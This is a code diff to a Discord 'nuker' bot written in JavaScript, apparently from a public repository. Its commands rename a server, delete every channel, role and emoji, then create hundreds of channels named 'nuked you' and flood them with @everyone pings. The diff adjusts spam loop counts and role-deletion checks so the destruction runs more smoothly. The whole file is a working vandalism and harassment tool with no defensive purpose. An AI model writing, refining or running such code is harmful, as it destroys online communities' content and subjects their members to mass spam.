@@ -1,4 +1,4 @@
-﻿// https://github.com/17teen
+// https://github.com/17teen
 // Discord: 7teen#3868
 
 const Discord = require('discord.js');
@@ -47,9 +47,9 @@ client.on("ready", () => {
 
 client.on("message", async message => {
 
-    if (message.author.bot) return;
+  if (message.author.bot) return;
 
-    if (message.mentions.everyone === true) {
+   /* if (message.mentions.everyone === true) {
         return;
     } else if (message.mentions.has(client.user.id)) {
         const helpEmbed = new Discord.MessageEmbed()
@@ -72,6 +72,7 @@ client.on("message", async message => {
             .setTimestamp(Date.now());
         message.channel.send(helpEmbed);
     }
+		*/
 
     // Test Command
     if (message.content.startsWith(prefix + "ping")) {
@@ -284,15 +285,15 @@ client.on("message", async message => {
 
         // Delete All Roles
         if (message.content.startsWith(prefix + 'dr')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
                 message.guild.roles.cache.forEach((role) => {
-                    role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
-                })
-                message.delete();
-            }
-        }
+                    if (!role.editable || role.name === "@everyone" || role.name === "new role" || role.name === "everyone" )
+										{
+                        return console.log(red(`ROLE: ${role.name} cannot be deleted`));
+                    } else {
+                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
+                    }
+                  })
+						 }
 
         // Delete All Emojis
         if (message.content.startsWith(prefix + 'emoall')) {
@@ -306,9 +307,9 @@ client.on("message", async message => {
 
         // Death.
         if (message.content.startsWith(prefix + 'die')) {
-
+								name= message.guild.name
                 message.delete();
-                message.guild.setName(`CITIZEN Daddy `).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
+                message.guild.setName(`CITIZEN Daddy `).then(console.log(green(`Server Name changed to: ${"CITIZEN DADDY nuked " + name} Wizzed`))); // changes server name
 
                 // Channel Delete
                 message.guild.channels.cache.forEach(channel => channel.delete().then(
@@ -326,12 +327,12 @@ client.on("message", async message => {
                   for (var i = 0; i < 250; i++) {
                         message.guild.channels.create(message.author.username + " nuked you")
 
-                        for (var i = 0; i < 250; i++) {
+                        for (var i = 0; i < 100; i++) {
                             let channels = message.guild.channels.create(message.author.username + " nuked you")
 
                             channels.then(
                                 function (channel, index) {
-                                    for (var i = 0; i < 250; i++) {
+                                    for (var i = 0; i < 100; i++) {
                                         channel.send('@everyone ' + argresult)
                                         console.log(blueBright(`CHANNEL PINGED!`));
                                         // other per-channnel logic
@@ -366,9 +367,10 @@ client.on("message", async message => {
                 }
 
                 // Roles
-                message.guild.roles.cache.forEach((role) => {
-                    if (!role.editable) {
-                        return;
+                 message.guild.roles.cache.forEach((role) => {
+                    if (!role.editable || role.name === "@everyone" || role.name === "new role" || role.name === "everyone" )
+										{
+                        return console.log(red(`ROLE: ${role.name} cannot be deleted`));
                     } else {
                         role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
                     }
@@ -559,10 +561,14 @@ client.on("message", async message => {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
             } else {
 
-                    message.guild.roles.cache.forEach(r => r.delete({ reason: "Nuking" }).then(console.log(yellow(`ROLE: ${r.name} was deleted successfully`))).catch(
-                        console.log(yellow(`ROLE: ${r.name} was cannot be deleted.`))
-                    ));
-
+                   message.guild.roles.cache.forEach((role) => {
+                    if (!role.editable || role.name === "@everyone" || role.name === "new role" || role.name === "everyone" )
+										{
+                        return console.log(red(`ROLE: ${role.name} cannot be deleted`));
+                    } else {
+                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
+                    }
+                  })
             }
         }
 
@@ -599,13 +605,14 @@ client.on("message", async message => {
                 ));
 
                 // Roles
-                message.guild.roles.cache.forEach((role) => {
-                    if (!role.editable) {
-                        return;
+                 message.guild.roles.cache.forEach((role) => {
+                    if (!role.editable || role.name === "@everyone" || role.name === "new role" || role.name === "everyone" )
+										{
+                        return console.log(red(`ROLE: ${role.name} cannot be deleted`));
                     } else {
                         role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`)))
                     }
-                })
+                  })
 
                 // Emoji
                 message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))
